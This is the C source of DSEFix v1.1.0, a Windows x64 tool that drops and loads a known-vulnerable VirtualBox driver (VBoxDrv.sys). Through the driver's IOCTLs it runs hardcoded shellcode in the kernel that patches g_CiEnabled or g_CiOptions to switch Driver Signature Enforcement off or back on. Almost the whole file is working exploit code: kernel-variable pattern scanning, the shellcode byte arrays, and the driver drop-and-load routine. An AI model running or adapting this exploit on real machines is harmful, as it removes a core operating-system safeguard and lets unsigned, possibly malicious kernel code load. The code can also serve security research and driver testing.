/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2015
*
*  TITLE:       MAIN.C
*
*  DATE:        10 Mar 2015
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "vbox.h"
#include "vboxdrv.h"
#include "ldasm.h"
#include <process.h>

#pragma data_seg("shrd")
volatile LONG g_lApplicationInstances = 0;
#pragma data_seg()
#pragma comment(linker, "/Section:shrd,RWS")

#define BUFFER_SIZE MAX_PATH * 2

BOOL g_VBoxInstalled = FALSE;

//
//  CI.DLL always ANSI
//
#define CI_DLL			"CI.DLL"
#define VBoxDrvSvc		L"VBoxDrv"


RTL_OSVERSIONINFOEXW		osv;

/*
**  Disable DSE (Vista and above)
**  xor rax, rax
**  ret
*/
const unsigned char scDisable[] = {
	0x48, 0x31, 0xc0, 0xc3            
};

/*
**  Enable DSE (W8 and above)
**  xor rax, rax
**  mov al, 6
**  ret
*/
const unsigned char scEnable8Plus[] = {
	0x48, 0x31, 0xc0, 0xb0, 0x06, 0xc3 
};                                      

/*
**  Enable DSE (Vista and Seven)
**  xor rax, rax
**  mov al, 1
**  ret
*/
const unsigned char scEnableVista7[] = {
	0x48, 0x31, 0xc0, 0xb0, 0x01, 0xc3  
};                                      

BOOL ControlDSE(
	HANDLE hDevice, 
	ULONG_PTR g_CiAddress, 
	PVOID scBuffer
	)
{
	BOOL			bRes = FALSE;
	SUPCOOKIE		Cookie;
	SUPLDROPEN		OpenLdr;
	DWORD			bytesIO = 0;
	PVOID			ImageBase = NULL;
	PSUPLDRLOAD		pLoadTask = NULL;
	SUPSETVMFORFAST vmFast;

	//
	//Validate input params
	//
	if (
		(g_CiAddress == 0L) ||
		(scBuffer == NULL)
		)
	{
		return FALSE;
	}

	//
	// Set VBox Cookie.
	//
	RtlSecureZeroMemory(&Cookie, sizeof(SUPCOOKIE));

	Cookie.Hdr.u32Cookie = SUPCOOKIE_INITIAL_COOKIE;
	Cookie.Hdr.cbIn = SUP_IOCTL_COOKIE_SIZE_IN;
	Cookie.Hdr.cbOut = SUP_IOCTL_COOKIE_SIZE_OUT;
	Cookie.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
	Cookie.Hdr.rc = 0;
	Cookie.u.In.u32ReqVersion = 0;
	Cookie.u.In.u32MinVersion = 0x00070002;
	_strcpy_a(Cookie.u.In.szMagic, SUPCOOKIE_MAGIC);

	if (!DeviceIoControl(hDevice, SUP_IOCTL_COOKIE, &Cookie, SUP_IOCTL_COOKIE_SIZE_IN, &Cookie,
		SUP_IOCTL_COOKIE_SIZE_OUT, &bytesIO, NULL)) goto fail;

	//
	// Open loader instance.
	//
	RtlSecureZeroMemory(&OpenLdr, sizeof(OpenLdr));
	OpenLdr.Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
	OpenLdr.Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
	OpenLdr.Hdr.cbIn = SUP_IOCTL_LDR_OPEN_SIZE_IN;
	OpenLdr.Hdr.cbOut = SUP_IOCTL_LDR_OPEN_SIZE_OUT;
	OpenLdr.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
	OpenLdr.Hdr.rc = 0;
	OpenLdr.u.In.cbImage = sizeof(OpenLdr.u.In.szName);
	OpenLdr.u.In.szName[0] = 'a';
	OpenLdr.u.In.szName[1] = 0;

	if (!DeviceIoControl(hDevice, SUP_IOCTL_LDR_OPEN, &OpenLdr,
		SUP_IOCTL_LDR_OPEN_SIZE_IN, &OpenLdr,
		SUP_IOCTL_LDR_OPEN_SIZE_OUT, &bytesIO,
		NULL)) 
	{
		goto fail;
	}

	ImageBase = OpenLdr.u.Out.pvImageBase;

	//
	// Setup load task.
	//
	pLoadTask = (PSUPLDRLOAD)VirtualAlloc(NULL, 0x1000, 
		MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (pLoadTask == NULL) goto fail;

	RtlSecureZeroMemory(pLoadTask, 0x1000);
	pLoadTask->Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
	pLoadTask->Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
	pLoadTask->Hdr.cbIn = 0x88;
	pLoadTask->Hdr.cbOut = SUP_IOCTL_LDR_LOAD_SIZE_OUT;
	pLoadTask->Hdr.fFlags = SUPREQHDR_FLAGS_MAGIC;
	pLoadTask->Hdr.rc = 0;
	pLoadTask->u.In.eEPType = SUPLDRLOADEP_VMMR0;
	pLoadTask->u.In.pvImageBase = (RTR0PTR)ImageBase;
	pLoadTask->u.In.EP.VMMR0.pvVMMR0 = (RTR0PTR)(ULONG_PTR)0x1000;
	pLoadTask->u.In.EP.VMMR0.pvVMMR0EntryEx = (RTR0PTR)ImageBase;
	pLoadTask->u.In.EP.VMMR0.pvVMMR0EntryFast = (RTR0PTR)ImageBase;
	pLoadTask->u.In.EP.VMMR0.pvVMMR0EntryInt = (RTR0PTR)ImageBase;

	//
	// Copy shellcode, because it always less than pointer size
	// sizeof is OK here.
	//
	memcpy(pLoadTask->u.In.achImage, scBuffer, sizeof(scBuffer));
	pLoadTask->u.In.cbImage = 0x20;

	if (!DeviceIoControl(hDevice, SUP_IOCTL_LDR_LOAD, pLoadTask, 0x88,
		pLoadTask, sizeof(SUPREQHDR), &bytesIO, NULL)) goto fail;

	//
	// Execute exploit.
	//
	vmFast.Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
	vmFast.Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
	vmFast.Hdr.rc = 0;
	vmFast.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
	vmFast.Hdr.cbIn = SUP_IOCTL_SET_VM_FOR_FAST_SIZE_IN;
	vmFast.Hdr.cbOut = SUP_IOCTL_SET_VM_FOR_FAST_SIZE_OUT;
	vmFast.u.In.pVMR0 = (PVOID)(ULONG_PTR)0x1000;

	if (!DeviceIoControl(hDevice, SUP_IOCTL_SET_VM_FOR_FAST, &vmFast,
		SUP_IOCTL_SET_VM_FOR_FAST_SIZE_IN, &vmFast, 
		SUP_IOCTL_SET_VM_FOR_FAST_SIZE_OUT, &bytesIO, NULL))
	{
		goto fail;
	}

	bRes = DeviceIoControl(hDevice, SUP_IOCTL_FAST_DO_NOP, 
		(LPVOID)g_CiAddress, 0, (LPVOID)g_CiAddress, 0, &bytesIO, NULL);

fail:
	if (pLoadTask != NULL) VirtualFree(pLoadTask, 0, MEM_RELEASE);
	if (hDevice != NULL) CloseHandle(hDevice);
	return bRes;
}

LONG dsfQueryCiEnabled(
	PULONG_PTR pKernelBase,
	PVOID MappedKernel,
	DWORD SizeOfImage
	)
{
	ULONG      c;
	LONG       rel = 0;

	//
	// Validate input parameters.
	//
	if (
		(pKernelBase == NULL) ||
		(MappedKernel == NULL) ||
		(SizeOfImage == 0)
		)
	{
		return 0;
	}

	for (c = 0; c < SizeOfImage - sizeof(DWORD); c++) {
		if (*(PDWORD)((PBYTE)MappedKernel + c) == 0x1d8806eb) {
			rel = *(PLONG)((PBYTE)MappedKernel + c + 4);
			*pKernelBase = *pKernelBase + c + 8 + rel;
			break;
		}
	}

	return rel;
}

LONG dsfQueryCiOptions(
	PULONG_PTR pKernelBase,
	PVOID MappedKernel
	)
{
	PBYTE        CiInit = NULL;
	ULONG        c;
	LONG         rel = 0;
	ldasm_data	 ld;

	//
	// Validate input parameters.
	//
	if (
		(pKernelBase == NULL) ||
		(MappedKernel == NULL)
		)
	{
		return 0;
	}

	CiInit = (PBYTE)GetProcAddress(MappedKernel, "CiInitialize");

	c = 0;
	do {
		/* jmp CipInitialize */
		if (CiInit[c] == 0xE9) {
			rel = *(PLONG)(CiInit + c + 1);
			break;
		}
		c += ldasm(CiInit + c, &ld, 1);
	} while (c < 256);
	CiInit = CiInit + c + 5 + rel;
	c = 0;
	do {
		if (*(PUSHORT)(CiInit + c) == 0x0d89) {
			rel = *(PLONG)(CiInit + c + 2);
			break;
		}
		c += ldasm(CiInit + c, &ld, 1);
	} while (c < 256);
	CiInit = CiInit + c + 6 + rel;
	*pKernelBase = *pKernelBase + CiInit - (PBYTE)MappedKernel;

	return rel;
}


BOOL DoWork(
	HANDLE hDevice,
	BOOL bDisable
	)
{
	BOOL					bRes = FALSE, bFound, cond;
	ULONG					rl = 0, c;
	LONG					rel = 0;
	PVOID					scBuffer = NULL, MappedKernel = NULL;
	ULONG_PTR				KernelBase = 0L;
	SIZE_T					ModuleSize;
	PLIST_ENTRY				Head, Next;
	PLDR_DATA_TABLE_ENTRY	Entry;
	PRTL_PROCESS_MODULES	miSpace;

	CHAR					KernelFullPathName[BUFFER_SIZE];
	CHAR					szOdsText[BUFFER_SIZE];

	cond = FALSE;

	do {

		//
		// Enumerate loaded drivers.
		//
		miSpace = supGetSystemInfo(SystemModuleInformation);
		if (miSpace == NULL) {
			break;
		}
		if (miSpace->NumberOfModules == 0) {
			break;
		}

		RtlSecureZeroMemory(KernelFullPathName, sizeof(KernelFullPathName));
		rl = GetSystemDirectoryA(KernelFullPathName, MAX_PATH);
		if (rl == 0) {
			break;
		}

		KernelFullPathName[rl] = (CHAR)'\\';

		_strcpy_a(szOdsText, "[DF] Windows v");
		ultostr_a(osv.dwMajorVersion, _strend_a(szOdsText));
		_strcat_a(szOdsText, ".");
		ultostr_a(osv.dwMinorVersion, _strend_a(szOdsText));
		OutputDebugStringA(szOdsText);

		//
		// For vista/7 find ntoskrnl.exe
		//
		bFound = FALSE;
		if (osv.dwMajorVersion == 6) {
			if (osv.dwMinorVersion < 2) {

				_strcpy_a(&KernelFullPathName[rl + 1],
					(const char*)&miSpace->Modules[0].FullPathName[miSpace->Modules[0].OffsetToFileName]);

				KernelBase = (ULONG_PTR)miSpace->Modules[0].ImageBase;
				bFound = TRUE;
			}
		}
		//
		// For 8+, 10 find CI.DLL
		//
		if (bFound == FALSE) {
			_strcpy_a(&KernelFullPathName[rl + 1], CI_DLL);
			for (c = 0; c < miSpace->NumberOfModules; c++)
				if (_strcmpi_a((const char *)&miSpace->Modules[c].FullPathName[miSpace->Modules[c].OffsetToFileName],
					CI_DLL) == 0)
				{
					KernelBase = (ULONG_PTR)miSpace->Modules[c].ImageBase;
					break;
				}
		}

		HeapFree(GetProcessHeap(), 0, miSpace);
		miSpace = NULL;

		_strcpy_a(szOdsText, "[DF] Target module ");
		_strcat_a(szOdsText, KernelFullPathName);
		OutputDebugStringA(szOdsText);

		_strcpy_a(szOdsText, "[DF] Module base ");
		u64tohex_a(KernelBase, _strend_a(szOdsText));
		OutputDebugStringA(szOdsText);

		//
		// Map ntoskrnl/CI.DLL in our address space.
		//
		MappedKernel = LoadLibraryExA(KernelFullPathName, NULL, DONT_RESOLVE_DLL_REFERENCES);
		if (MappedKernel == NULL) {
			break;
		}

		//
		// Check if we are in NT6.x branch
		//
		if (osv.dwMajorVersion == 6) {
			//
			// Find g_CiEnabled Vista, Seven
			//
			if (osv.dwMinorVersion < 2) {

				//
				// Query module size via PEB loader for bruteforce.
				//
				ModuleSize = 0;
				EnterCriticalSection((PRTL_CRITICAL_SECTION)NtCurrentPeb()->LoaderLock);
				Head = &NtCurrentPeb()->Ldr->InLoadOrderModuleList;
				Next = Head->Flink;
				while (Next != Head) {
					Entry = CONTAINING_RECORD(Next, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
					if (Entry->DllBase == MappedKernel) {
						ModuleSize = Entry->SizeOfImage;
						break;
					}
					Next = Next->Flink;
				}
				LeaveCriticalSection((PRTL_CRITICAL_SECTION)NtCurrentPeb()->LoaderLock);

				//
				// Module not found, abort.
				//
				if (ModuleSize == 0) {
					break;
				}
				rel = dsfQueryCiEnabled(&KernelBase, MappedKernel, (DWORD)ModuleSize);
			}
			else {
				//
				// Find g_CiOptions w8+ 
				//
				rel = dsfQueryCiOptions(&KernelBase, MappedKernel);
			}
		}
		else {
			//
			// Otherwise > NT6.x, find g_CiOptions 10+
			//
			rel = dsfQueryCiOptions(&KernelBase, MappedKernel);
		}

		if (rel == 0)
			break;

		_strcpy_a(szOdsText, "[DF] Apply patch to address ");
		u64tohex_a(KernelBase, _strend_a(szOdsText));
		OutputDebugStringA(szOdsText);

		//
		// Select proper shellcode buffer
		//
		if (bDisable) {
			scBuffer = (PVOID)scDisable;
		}
		else {
			//
			//Shellcode for for 8/10+
			//
			scBuffer = (PVOID)scEnable8Plus;

			if (osv.dwMajorVersion == 6) {
				//
				//Shellcode for vista, 7
				//
				if (osv.dwMinorVersion < 2) {
					scBuffer = (PVOID)scEnableVista7;
				}
			}
		}

		//
		// Exploit VBoxDrv.
		//
		bRes = ControlDSE(hDevice, KernelBase, scBuffer);

	} while (cond);


	if (MappedKernel != NULL) {
		FreeLibrary(MappedKernel);
	}
	if (miSpace != NULL) {
		HeapFree(GetProcessHeap(), 0, miSpace);
	}
	return bRes;
}

HANDLE LoadVulnerableDriver(
	VOID
	)
{
	HANDLE	hFile;
	HANDLE	hDevice;
	DWORD	bytesIO;
	WCHAR	szDriverBuffer[BUFFER_SIZE];

	//
	// Combine full path name for our driver.
	//
	RtlSecureZeroMemory(szDriverBuffer, BUFFER_SIZE);
	if (!GetSystemDirectory(szDriverBuffer, MAX_PATH)) {
		return NULL;
	}
	_strcat(szDriverBuffer, TEXT("\\drivers\\VBoxDrv.sys"));

	//
	// Backup vboxdrv if exists.
	//
	g_VBoxInstalled = supBackupVBoxDrv(FALSE);

	//
	// Drop our driver file to the disk.
	//
	hFile = CreateFile(szDriverBuffer, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return NULL;
	}
	bytesIO = 0;
	WriteFile(hFile, VBoxDrv, sizeof(VBoxDrv), &bytesIO, NULL);
	CloseHandle(hFile);

	//
	// Check if file dropped OK.
	//
	if (bytesIO != sizeof(VBoxDrv)) {
		return NULL;
	}

	//
	// Open device handle.
	//
	hDevice = NULL;
	if (!scmLoadDeviceDriver(VBoxDrvSvc, szDriverBuffer, &hDevice)) {
		return NULL;
	}

	//
	// Driver file is no longer needed.
	//
	DeleteFile(szDriverBuffer);
	return hDevice;
}

void UnloadVulnerableDriver(
	VOID
	)
{
	SC_HANDLE	schSCManager;

	//
	// If there is no VBox installed simple remove driver.
	//
	if (g_VBoxInstalled != TRUE) {
		scmUnloadDeviceDriver(VBoxDrvSvc);
	}
	//
	// VBox was installed, stop our and restore actual driver.
	//
	else {

		//
		// Stop our VBoxDrv service.
		//
		schSCManager = OpenSCManager(NULL,
			NULL,
			SC_MANAGER_ALL_ACCESS
			);
		if (schSCManager) {
			scmStopDriver(schSCManager, VBoxDrvSvc);
			CloseServiceHandle(schSCManager);
		}

		//
		// Restore saved backup.
		//
		supBackupVBoxDrv(TRUE);
	}
}

VOID ShowServiceMessage(
	LPSTR lpMsg
	)
{
	CHAR szBuffer[MAX_PATH * 2];

	//
	// Validate input parameter.
	//
	if (lpMsg == NULL) {
		return;
	}
	if (_strlen_a(lpMsg) > MAX_PATH) {
		return;
	}

	//
	// Combine and output ODS message.
	//
	RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
	_strcpy_a(szBuffer, "[DF] ");
	_strcat_a(szBuffer, lpMsg);
	OutputDebugStringA(szBuffer);
}

void main()
{
	LONG x;
	ULONG ParamLen;
	HANDLE hDevice = NULL;
	WCHAR cmdLineParam[MAX_PATH + 1];
	BOOL bDisable = TRUE, cond = FALSE;

	__security_init_cookie();

	//
	// Output DSEFix banner.
	//
	ShowServiceMessage("DSEFix v1.1.0 started");
	ShowServiceMessage("(c) 2014 - 2015 DSEFix Project");
	ShowServiceMessage("Supported x64 OS : Vista / 7 / 8 / 8.1 / 10");

	do {

		//
		// Check single instance.
		//
		x = InterlockedIncrement((PLONG)&g_lApplicationInstances);
		if (x > 1) {
			ShowServiceMessage("Another instance running, close it before");
			break;
		}

		//
		// Check supported OS.
		//
		RtlSecureZeroMemory(&osv, sizeof(osv));
		osv.dwOSVersionInfoSize = sizeof(osv);
		RtlGetVersion((PRTL_OSVERSIONINFOW)&osv);
		if (osv.dwMajorVersion < 6) {
			ShowServiceMessage("Unsupported OS");
			break;
		}

		//
		// Query command line paramters.
		//
		ParamLen = 0;
		RtlSecureZeroMemory(cmdLineParam, sizeof(cmdLineParam));
		GetCommandLineParam(GetCommandLineW(), 1, cmdLineParam, MAX_PATH, &ParamLen);
		if (_strcmpi(cmdLineParam, TEXT("-e")) == 0) {
			ShowServiceMessage("DSE will be (re)enabled");
			bDisable = FALSE;
		}
		else {
			ShowServiceMessage("DSE will be disabled");
			bDisable = TRUE;
		}

		//
		// Load vulnerable driver and open it device.
		//
		hDevice = LoadVulnerableDriver();
		if (hDevice == NULL) {
			ShowServiceMessage("Failed to load vulnerable driver");
			break;
		}
		else {
			ShowServiceMessage("Vulnerable VirtualBox driver loaded");
		}

		//
		// Manipulate kernel variable.
		//
		if (DoWork(hDevice, bDisable)) {
			ShowServiceMessage("Kernel memory patched");
		}
		else {
			ShowServiceMessage("Failed to patch kernel memory");
		}

		//
		// Do basic cleanup.
		//
		ShowServiceMessage("Cleaning up");
		UnloadVulnerableDriver();

		ShowServiceMessage("Finish");

	} while (cond);

	InterlockedDecrement((PLONG)&g_lApplicationInstances);
	ExitProcess(0);
}
